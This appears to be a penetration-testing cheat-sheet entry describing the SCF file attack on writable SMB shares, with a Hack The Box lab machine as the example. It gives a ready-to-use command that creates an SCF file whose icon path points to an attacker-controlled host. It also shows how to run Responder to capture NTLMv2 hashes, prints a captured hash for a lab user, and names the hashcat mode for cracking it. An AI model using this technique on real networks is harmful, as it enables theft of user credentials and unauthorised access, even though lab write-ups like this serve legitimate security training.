### scf file attack
if you have write access to a share, drop a scf file pointing to a responder share to capture hashes.

source: https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/
lab: https://app.hackthebox.com/machines/Driver

- create the scf file
```bash
cat << EOF > exploit.scf       
[Shell]
Command=2
IconFile=\\10.10.14.74\share\exploit.ico
[Taskbar]
Command=ToggleDesktop
EOF
```

- drop the exploit on the share by any means
- start resonder and wait for connections:
```bash
sudo responder -w --lm -v -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.1.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[...]

[SMB] NTLMv2 Client   : ::ffff:10.10.11.106
[SMB] NTLMv2 Username : DRIVER\tony
[SMB] NTLMv2 Hash     : tony::DRIVER:90915e30a4d61b55:EFD5982FC730F2132B289A758EF1AB26:010100000000000017D7481F870BD801DADD4A94693D22FF00000000020000000000000000000000
[...]
```

- crack with hashcat -m 5600